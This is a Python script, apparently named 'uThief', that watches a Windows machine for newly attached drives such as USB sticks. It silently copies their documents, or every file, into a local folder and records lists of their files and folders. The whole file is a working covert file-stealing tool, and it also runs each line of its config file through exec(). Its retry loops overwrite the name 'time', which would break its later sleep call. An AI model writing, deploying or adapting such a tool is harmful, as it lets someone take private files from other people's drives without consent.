import traceback
import os
import shutil
import sys
import time
from datetime import datetime

WORK_DIR = str(".\\")
CLEVER_COPY = 1
AUTO_EXIT = 1
MAX_RETRY_TIME = 3
CLEVER_FILTER = ["doc","docx","xls","xlsx","ppt","pptx","pdf","txt"]
RAGE_EXCLUDE = []
TIME_SLEEP = 3

diskList = []

def log_write(message,path,level,service,outprint=True,output=True):
    time_raw = time.localtime(time.time())
    date_now = time.strftime("%Y-%m-%d",time_raw)
    human_read_week = ["Mon","Tue","Wed","Thu","Fri","Sat","Sun"]
    week_now = human_read_week[int(datetime.now().weekday())]
    time_now = time.strftime("%H:%M:%S",time_raw)
    time_now = str(date_now + " " + week_now + " " + time_now)
    time_now_raw = str("[" + str(time_now) + "]")
    log_message = str("")
    log_message_raw = str("")
    log_message_raw += time_now_raw
    time_now = str("[" + str(time_now) + "]")
    log_message += time_now
    level_no = int(level)
    level_list = ["DEBUG","INFO","REMIND","WARNING","CRITICAL","ERROR","CRISIS"]
    try:
        level = str(level_list[level_no])
    except IndexError:
        level = str("NOTYPE")
    level_raw = str(" <" + level + "> ")
    log_message_raw += level_raw
    level = str(" <" + level + "> ")
    log_message += level
    
    try:
        service_raw = str("" + service + "")
        log_message_raw += service_raw
        service = str("" + service + "")
        log_message += service
    except:
        pass
    log_message += str(": ")
    log_message += str(message)
    log_message_raw += str(": ")
    log_message_raw += str(message)
    if outprint:
        print(log_message)
    if output:
        try:
            log_file = open(path,"a+",encoding="utf-8")
            log_file.write(log_message_raw)
            log_file.write("\n")
            log_file.close()
        except:
            pass
    else:
        pass

def getDiskList():  
    diskList = []
    for diskIndex in range(65,91):
        disk = str(chr(diskIndex)) + ':'
        if os.path.isdir(disk):
            diskList.append(disk)
    return diskList

def newDisk():
    global diskList
    oldDiskList = diskList
    newDiskList = getDiskList()
    newDisk = []
    for disk in newDiskList:
        if str(disk) not in oldDiskList:
            newDisk.append(str(disk))
            message = str(("发现新磁盘：%s")%(str(disk)))
            log_write(message,WORK_DIR + "log.txt",2,"47.py",output=True,outprint=False)
    for disk in oldDiskList:
        if str(disk) not in newDiskList:
            message = str(("磁盘被移除：%s")%(str(disk)))
            log_write(message,WORK_DIR + "log.txt",2,"47.py",output=True,outprint=False)
    diskList = newDiskList
    return newDisk

def getAllSub(path):
    Dirlist = []
    Filelist = []
    for home, dirs, files in os.walk(path):
        # 获得所有文件夹
        for dirname in dirs:
            Dirlist.append(os.path.join(home, dirname))
        # 获得所有文件
        for filename in files:
            Filelist.append(os.path.join(home, filename))
    return Dirlist, Filelist

def outputTXT(inputList,path,fileName):
    fileTXT = open(str(path+fileName),"w",encoding="utf-8")
    for line in inputList:
        fileTXT.write(str(line)+str("\n"))
    fileTXT.close()
    return

def rageCopy(disk):
    global NEED_RETRY
    NEED_RETRY = False
    global RAGE_EXCLUDE 
    message = str("模式：狂暴模式")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    disk += str("\\")
    message = str("枚举文件和文件夹。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    thisDisk = getAllSub(disk)
    fileList = thisDisk[1]
    dirList = thisDisk[0]
    message = str("枚举文件和文件夹完成。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    message = str("创建目录结构。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    for a_dir in dirList:
        newDir = str(a_dir + "\\")
        newDir = newDir.replace(str(disk),str(WORK_DIR) + str("DISK_" + disk[0] + "\\"))
        try:
            os.makedirs(newDir)
        except FileExistsError:
            continue
    message = str("创建目录结构完成。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    for a_file in fileList:
        if str(str(a_file).split(".")[-1]).lower() not in RAGE_EXCLUDE:
            if os.path.exists(a_file):
                message = str(("正在复制：%s")%(str(a_file)))
                log_write(message,WORK_DIR + "log.txt",1,"uThief.py",output=True,outprint=False)
                location = str(a_file).replace(str(disk),str(WORK_DIR) + str("DISK_" + disk[0] + "\\"))
                shutil.copyfile(a_file,location)
            else:
                message = str(("文件复制异常，跳过：%s")%(str(a_file)))
                log_write(message,WORK_DIR + "log.txt",3,"uThief.py",output=True,outprint=False)
                NEED_RETRY = False
    message = str("复制完成。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    message = str("保存所有文件列表fileList.txt。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    outputTXT(fileList,WORK_DIR + str("\\" + "DISK_" + disk[0] + "\\"),str("fileList.txt"))
    message = str("保存完成。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    message = str("保存所有文件夹列表dirList。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    outputTXT(dirList,WORK_DIR + str("\\" + "DISK_" + disk[0] + "\\"),str("dirList.txt"))
    message = str("保存完成。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    return

def cleverCopy(disk):
    global NEED_RETRY
    NEED_RETRY = False
    global CLEVER_FILTER
    message = str("模式：机智模式")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    disk += str("\\")
    message = str("枚举文件和文件夹。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    thisDisk = getAllSub(disk)
    fileList = thisDisk[1]
    dirList = thisDisk[0]
    message = str("枚举文件和文件夹完成。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    message = str("创建目录结构。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    for a_dir in dirList:
        newDir = str(a_dir + "\\")
        newDir = newDir.replace(str(disk),str(WORK_DIR) + str("DISK_" + disk[0] + "\\"))
        try:
            os.makedirs(newDir)
        except FileExistsError:
            continue
    message = str("创建目录结构完成。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    for a_file in fileList:
        if str(str(a_file).split(".")[-1]).lower() in CLEVER_FILTER:
            if os.path.exists(a_file):
                message = str(("正在复制：%s")%(str(a_file)))
                log_write(message,WORK_DIR + "log.txt",1,"uThief.py",output=True,outprint=False)
                location = str(a_file).replace(str(disk),str(WORK_DIR) + str("DISK_" + disk[0] + "\\"))
                shutil.copyfile(a_file,location)
            else:
                message = str(("文件复制异常，跳过：%s")%(str(a_file)))
                log_write(message,WORK_DIR + "log.txt",3,"uThief.py",output=True,outprint=False)
    message = str("复制完成。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    message = str("保存所有文件列表fileList.txt。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    outputTXT(fileList,WORK_DIR + str("\\" + "DISK_" + disk[0] + "\\"),str("fileList.txt"))
    message = str("保存完成。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    message = str("保存所有文件夹列表dirList.txt。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    outputTXT(dirList,WORK_DIR + str("\\" + "DISK_" + disk[0] + "\\"),str("dirList.txt"))
    message = str("保存完成。")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    return

try:
    try:
        configFile = open(".\\CONFIG.txt","r",encoding="UTF-8")
        for line in configFile.readlines():
            line = str(line).replace("\n","")
            if len(str(line)) == 0:
                continue
            if str(line)[0] == str("#"):
                continue
            else:
                if str("=") in str(line):
                    exec(line)
        configFile.close()
        message = str("使用CONFIG.txt内的配置。")
        log_write(message,WORK_DIR + "log.txt",3,"47.py",output=True,outprint=False)
    except FileNotFoundError:
        message = str("打开CONFIG.txt失败，使用默认配置。")
        log_write(message,WORK_DIR + "log.txt",3,"47.py",output=True,outprint=False)
    finally:
        if MAX_RETRY_TIME > 3:
            MAX_RETRY_TIME = 3
        if MAX_RETRY_TIME < 0:
            MAX_RETRY_TIME = 0
        if TIME_SLEEP <= 0:
            TIME_SLEEP = 1
        message = str("参数-WORK_DIR：" + str(WORK_DIR))
        log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
        message = str("参数-CLEVER_COPY：" + str(CLEVER_COPY))
        log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
        message = str("参数-AUTO_EXIT：" + str(AUTO_EXIT))
        log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
        message = str("参数-MAX_RETRY_TIME：" + str(MAX_RETRY_TIME))
        log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
        message = str("参数-CLEVER_FILTER：" + str(CLEVER_FILTER))
        log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
        message = str("参数-RAGE_EXCLUDE：" + str(RAGE_EXCLUDE))
        log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
        message = str("参数-TIME_SLEEP：" + str(TIME_SLEEP))
        log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)  
    NEED_RETRY = False
    message = str("第一次列举盘符")
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    diskList = getDiskList()
    message = str(("第一次列举盘符完成，发现的盘符：%s")%(str(diskList)))
    log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
    while True:
        thisNewDisk = newDisk()
        if len(thisNewDisk) == 0:
            pass
        else:
            for disk in thisNewDisk:
                message = str(("准备复制：%s")%(str(disk)))
                log_write(message,WORK_DIR + "log.txt",1,"47.py",output=True,outprint=False)
                try:
                    if CLEVER_COPY == 1:
                        cleverCopy(disk)
                        if NEED_RETRY:
                            for time in range(0,MAX_RETRY_TIME):
                                message = str(("需要重新复制，当前次数：%s，最大重试次数：%s")%(str(time+1),str(MAX_RETRY_TIME)))
                                log_write(message,WORK_DIR + "log.txt",2,"47.py",output=True,outprint=False)
                                cleverCopy(disk)
                                if NEED_RETRY:
                                    continue
                                else:
                                    break
                    else:
                        rageCopy(disk)
                        if NEED_RETRY:
                            for time in range(0,MAX_RETRY_TIME):
                                message = str(("需要重新复制，当前次数：%s，最大重试次数：%s")%(str(time+1),str(MAX_RETRY_TIME)))
                                log_write(message,WORK_DIR + "log.txt",2,"47.py",output=True,outprint=False)
                                rageCopy(disk)
                                if NEED_RETRY:
                                    continue
                                else:
                                    break
                except OSError:
                    message = str(("磁盘在复制时被移除：%s")%(str(disk)))
                    log_write(message,WORK_DIR + "log.txt",5,"47.py",output=True,outprint=False)
                    NEED_RETRY = True
            if NEED_RETRY:
                continue
            if AUTO_EXIT == 1:
                message = str("程序退出。")
                log_write(message,WORK_DIR + "log.txt",2,"47.py",output=True,outprint=False)
                sys.exit(0)
        time.sleep(TIME_SLEEP)
except Exception as errorInfo:
    # print(repr(errorInfo))
    # print(traceback.format_exc())
    message = str(traceback.format_exc()).split("\n")
    for i in message:
        log_write(i,WORK_DIR + "log.txt",6,"47.py",output=True,outprint=False)
    
